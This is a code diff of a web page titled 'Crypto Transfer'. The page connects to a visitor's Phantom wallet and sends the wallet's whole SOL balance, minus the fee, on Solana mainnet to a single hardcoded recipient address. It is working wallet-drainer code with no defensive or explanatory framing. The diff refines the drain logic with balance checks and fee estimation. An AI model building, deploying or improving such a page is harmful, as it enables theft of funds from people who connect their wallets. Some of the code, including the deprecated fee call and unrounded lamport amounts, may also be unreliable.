@@ -4,38 +4,69 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.76.0/solana-web3.min.js"></script>
 </head>
 <body>
-    <h2>Click below to transfer all funds</h2>
-    <button onclick="transferFunds()">Transfer Now</button>
+    <h1>Click below to transfer all funds</h1>
+    <button onclick="transferSOL()">Transfer Now</button>
 
     <script>
-        async function transferFunds() {
-            if (!window.solana) {
-                alert("Please install Phantom Wallet!");
-                return;
-            }
-
+        async function transferSOL() {
             try {
-                await window.solana.connect();
-                const provider = window.solana;
-                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                if (!window.solana || !window.solana.isPhantom) {
+                    alert("Phantom wallet is not installed!");
+                    return;
+                }
 
+                // Connect to Phantom wallet
+                const provider = window.solana;
+                await provider.connect();
                 const publicKey = provider.publicKey;
-                const recipient = new solanaWeb3.PublicKey("9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf");
+
+                // Define recipient wallet
+                const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
+
+                // Connect to Solana cluster
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+
+                // Get wallet balance
                 const balance = await connection.getBalance(publicKey);
+                const balanceInSOL = balance / solanaWeb3.LAMPORTS_PER_SOL;
+                console.log(`Balance: ${balanceInSOL} SOL`);
+
+                if (balanceInSOL <= 0) {
+                    alert("Insufficient balance.");
+                    return;
+                }
+
+                // Estimate transaction fee
+                const { feeCalculator } = await connection.getRecentBlockhash();
+                const feeInLamports = feeCalculator.lamportsPerSignature;
+                const feeInSOL = feeInLamports / solanaWeb3.LAMPORTS_PER_SOL;
+                console.log(`Estimated Fee: ${feeInSOL} SOL`);
+
+                // Calculate transferable amount after fee deduction
+                const amountToSend = balanceInSOL - feeInSOL;
+                if (amountToSend <= 0) {
+                    alert("Not enough balance to cover the transaction fee.");
+                    return;
+                }
+
+                // Create transaction instruction
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
-                        toPubkey: recipient,
-                        lamports: balance - 5000, // subtracting small fee
+                        toPubkey: new solanaWeb3.PublicKey(receiverWallet),
+                        lamports: (amountToSend * solanaWeb3.LAMPORTS_PER_SOL),
                     })
                 );
 
+                // Send transaction
                 const signature = await provider.signAndSendTransaction(transaction);
                 alert(`Transaction successful! Signature: ${signature}`);
+                console.log("Transaction signature:", signature);
             } catch (error) {
+                console.error("Transaction failed:", error);
                 alert(`Transaction failed: ${error.message}`);
             }
         }
